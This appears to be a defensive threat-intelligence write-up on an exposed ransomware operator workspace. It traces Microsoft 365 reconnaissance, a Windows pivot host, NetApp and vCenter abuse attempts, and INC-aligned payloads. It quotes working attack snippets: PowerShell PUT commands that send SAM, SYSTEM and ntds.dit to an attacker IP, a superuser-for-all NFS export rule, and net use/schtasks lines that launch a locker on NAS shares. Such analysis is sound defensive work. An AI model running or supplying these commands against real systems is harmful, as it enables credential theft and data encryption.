# Overview

This capture preserves a ransomware operator’s working directory at a useful point in the intrusion. The files tie together stolen cloud access, a live VPN session, a Windows pivot host, confirmed Active Directory theft, storage-management targeting, and a scripted NAS encryption path.

The strongest evidence sits in the middle of the operation, where many cases are usually thin. The archive shows how the operator learned the environment, moved through it, and prepared impact. It is less useful for proving final encryption outcomes.

## The Chain Preserved in the Capture

The capture supports a straightforward sequence:

1. Compromised Microsoft 365 access was used to mine mail and OneDrive for infrastructure knowledge.
2. A Windows host at `10.86.56.16` became the operator’s main bridge into the internal environment.
3. Active Directory hives and `ntds.dit` were exfiltrated to attacker infrastructure on July 14, 2026.
4. The same pivot was then used to tunnel into storage and virtualization management paths.
5. NetApp, OceanStor, Veeam, vCenter, and SMB-backed NAS shares were all pulled into the same workflow.
6. A Windows locker was staged against named NAS shares, while cross-platform Linux and ESXi payloads sat ready in a nested archive.

Each stage in that chain is backed by source artifacts. The confidence is not uniform across all of them, and keeping that line intact matters more than smoothing the story out.

# Cloud Access as Recon

The earliest meaningful activity preserved here is environment collection through Microsoft 365.

The Graph scripts are focused on administrative material, not broad mailbox collection. They search for device inventories, network changes, public IP moves, VPN details, jump-box guides, and VMware exports. The victim’s own collaboration data becomes an administrative map. (Evidence: `grab2.py:23-103`, `check_latest_it.py:63-93`, `download_vmware_archive.py:35-103`)

One short excerpt captures the intent:

```python
data = urllib.parse.urlencode({
    "grant_type": "password",
    "client_id": "[REDACTED]",
    "scope": "https://graph.microsoft.com/.default",
    "username": "[REDACTED]",
    "password": "[REDACTED]",
}).encode()

url = "https://graph.microsoft.com/v1.0/me/drive/root/search(q='devices%20accounts')"
url = "https://graph.microsoft.com/v1.0/me/drive/root/search(q='Jbox')"
```

A mailbox full of routine IT correspondence becomes a routing table, a password hint list, and a field guide to the management plane.

The looted documents sharpen that picture. Recovered spreadsheets and planning documents reference ESXi host moves, NetApp power-down tasks, remote access, backup weakness, firewalls, and SD-WAN/VPN dependencies. By the time the operator moved into WinRM and storage APIs, much of the environment had already been mapped in the victim’s own paperwork.

# The Host at the Center

The role of `10.86.56.16` pulls the rest of the workflow into focus.

That host appears over and over: in WinRM sessions, in portproxy rules, in storage scripts, in NAS deployment logic, and in Veeam and VMware targeting. It is the bridge between cloud-derived intelligence and hands-on operational access. (Evidence: `push_ntds.py:3`, `tunnel_setup.py:2-12`, `netapp_fix.py:2-57`, `nas_locker.py:2-24`, `netapp_audit.py:2-69`)

From that point on, the operator is working through the environment from a trusted administrative host.

# The First Hard Execution Evidence

Some artifacts show intent. `push_ntds.py` and `http_recv.log` show completed action.

The script uploads `SAM`, `SECURITY`, `SYSTEM`, and `ntds.dit` to `213.176.114.6`. The receiver log records matching `PUT` requests on July 14, 2026, between `17:14:08` and `17:16:18` UTC. That is the strongest confirmed action in the dataset. (Evidence: `push_ntds.py:7-21`, `http_recv.log:1-4`)

The code is blunt enough to be useful:

```powershell
Invoke-WebRequest -Uri "http://213.176.114.6:7777/SAM" -Method PUT -InFile "C:\Windows\Temp\SAM"
Invoke-WebRequest -Uri "http://213.176.114.6:7777/SECURITY" -Method PUT -InFile "C:\Windows\Temp\SECURITY"
Invoke-WebRequest -Uri "http://213.176.114.6:7777/SYSTEM" -Method PUT -InFile "C:\Windows\Temp\SYSTEM"
Invoke-WebRequest -Uri "http://213.176.114.6:7777/ntds.dit" -Method PUT -InFile "C:\Windows\Temp\ntds.dit"
```

The surrounding scripts matter too. The operator prepared multiple fallback paths around the same goal, including Base64 chunking over WinRM, temporary HTTP exposure, `esentutl` repair, `ntdsutil`, and attempted `DSInternals` parsing. The tooling is built to absorb friction rather than fail on the first obstacle.

# Moving Into the Management Plane

Once the AD material leaves the network, the workflow fans out into the systems that can do the most damage with the least noise: storage, backup, and virtualization.

The operator configured Windows `portproxy` rules on the pivot and then stood up attacker-side `socat` listeners to reach internal management services indirectly. `tunnels.log` shows those listeners online on July 14, then timing out repeatedly on July 15. Something broke the path. The capture does not say what. (Evidence: `tunnel_setup.py:6-12`, `start_tunnels.sh:4-9`, `tunnels.log:1-39`)

That tunnel layer turns internal management interfaces into reachable working surfaces for the operator.

## NetApp Was an Access Problem to Solve

The NetApp scripts do not stop at enumeration. One of them attempts to add `0.0.0.0/0` rules with read, write, and `superuser` access across export policies. Another comments openly about the next step: mount the exports on ESXi and run the locker. (Evidence: `netapp_fix.py:38-57`, `netapp_open.py:4-48`)

The key excerpt is short and ugly in exactly the right way:

```powershell
$rule = '{"clients":[{"match":"0.0.0.0/0"}],"ro_rule":["any"],"rw_rule":["any"],"superuser":["any"]}'
$result = NetApi "POST" "/protocols/nfs/export-policies/$($p.id)/rules" $rule
```

This is one of the clearest examples in the capture of an operator trying to make storage easier to reach before impact. The evidence does **not** prove that the rule was accepted. The capture preserves the attempt logic, not the resulting state.

## VMware Was Next in Line

The VMware scripts show the same pattern: move from visibility into control.

`vc_perms.py` attempts to grant the compromised domain account the built-in vCenter administrator role, create a CIS session, query the appliance `root` account, reset that password, and enable SSH and shell access. `vc_reset.py` and `vc_pwreset.py` extend that path into guest-operations password resets and clone-ticket exploration. `vc_snap_reset.py` adds a more invasive fallback: snapshot the appliance so the disk state can be manipulated from the hypervisor side. (Evidence: `vc_perms.py:18-72`, `vc_reset.py:20-59`, `vc_pwreset.py:27-73`, `vc_snap_reset.py:30-39`)

That is a meaningful escalation path, but it still falls short of proving successful vCenter takeover.

# The NAS Deployment Playbook

If one file explains what the operator was trying to achieve, it is `nas_locker.py`.

The script maps five named SMB shares on `10.31.8.15`, writes `C:\Windows\Temp\go.bat`, creates a scheduled task called `WinUpdate`, launches `locker.exe --mode fast --dir` against each mapped drive, and then checks whether `locker.exe` is running. (Evidence: `nas_locker.py:7-24`)

A condensed excerpt is enough:

```powershell
net use K: \\10.31.8.15\K /user:[REDACTED] [REDACTED]
net use N: \\10.31.8.15\NXP-DATA /user:[REDACTED] [REDACTED]

C:\Windows\Temp\locker.exe --mode fast --dir K:\
C:\Windows\Temp\locker.exe --mode fast --dir N:\

schtasks /create /tn WinUpdate /tr C:\Windows\Temp\go.bat /sc once /st 00:00 /ru SYSTEM /f
schtasks /run /tn WinUpdate
```

This is the best single artifact in the capture because it binds together credential reuse, the pivot host, the share targets, the execution wrapper, and the intended impact.

It is also the artifact most likely to be overstated. The capture proves **prepared** or **attempted** NAS deployment logic. It does **not** prove completed encryption of those shares. `nas_check.py` shows the operator returning to check `locker.exe` and remap the shares, which strengthens the case that the NAS path mattered operationally, but it still stops short of proving end-state impact.

# What the Payloads Add

The nested `vsilicon.zip` archive contains 14 platform-specific binaries, including Windows, Linux, and ESXi builds timestamped `2026-07-14 12:54`. Static reverse engineering adds useful context beyond family branding.

The Windows sample is a 64-bit PE with imports from `ADVAPI32`, `RstrtMgr`, `KERNEL32`, `bcrypt`, `ntdll`, and `WS2_32`, which is consistent with service interruption, file-lock handling, process enumeration, filesystem traversal, and cryptographic randomness generation. Its strings expose operator-facing controls for `dir`, `file`, `mode`, `sup`, `proc`, `serv`, and `hide`, plus shadow-copy disruption and `EncryptionAlgoSALSA20AES` markers. (Evidence: `binary_re_metadata.json`, `l.exe` offsets `0x1c44c8`, `0x1c4548`, `0x1c4a88`, `0x1c6088`)

The Linux and ESXi builds contain explicit ESXi-oriented strings including `vmsvc/power.off`, `vmsvc/snapshot.removeall`, and error paths for stopping ESXi machines and removing snapshots. That pushes the hypervisor path well past generic bundling. (Evidence: `x86_64-unknown-linux-esxi` offsets `0xa9732`, `0xab49d`; `x86_64-unknown-linux-gnu` offsets `0xc9d4d`, `0xca6f6`)

These traits align strongly with current public reporting on INC ransomware’s Rust-based Windows and Linux/ESXi payloads. They support a **high-confidence family alignment**. They do **not** prove a specific affiliate identity.

# Claim Boundaries

The capture supports a tight story as long as it stays inside its own evidence.

We can prove:

- targeted Microsoft 365 collection against infrastructure-relevant material
- a successful GlobalProtect session
- repeated WinRM use of a Windows pivot host
- successful exfiltration of `SAM`, `SECURITY`, `SYSTEM`, and `ntds.dit`
- internal tunneling toward storage and management interfaces
- explicit NetApp access-broadening attempts
- attempted vCenter and guest-operations abuse
- direct ESXi administration attempts
- prepared NAS-focused locker deployment
- a staged cross-platform INC-aligned payload set

We cannot prove:

- the initial access vector
- successful NetApp export-policy modification
- successful vCenter permission change or appliance password reset
- successful NAS encryption
- execution of the Linux or ESXi binaries
- operator affiliation beyond malware-family alignment

That is not a weakness in the analysis. It reflects the difference between what the capture shows and what it suggests.

# Why Defenders Should Care

Most ransomware reporting begins at encryption, the ransom note, or the incident summary after the operational work is already done.

This capture preserves the quieter part of the intrusion: stolen cloud access used to learn the environment, a trusted Windows system used to bridge into the core, and management-plane tooling used to turn privilege into reach. In that context, the ransomware binary is almost the least surprising part of the operation.

For defenders, the dangerous step was not just payload delivery. It was the convergence of:

- mailbox intelligence collection
- privileged remote administration
- AD database theft
- internal forwarding to management services
- storage access manipulation
- platform-specific impact tooling

Break any one of those links early enough and the ending changes.

# Conclusion

The exposed workspace preserves something more useful than a single detonation event: the operator’s working method.

That method moved from mailbox to map, from map to pivot, from pivot to domain theft, and from domain theft to the systems most likely to magnify impact. The strongest evidence sits in the connective tissue between access and impact, which is where many public writeups are weakest.

The familiar part is that ransomware actors target NAS devices. The useful part is seeing how methodically they use ordinary enterprise data and ordinary administrative surfaces to get there.
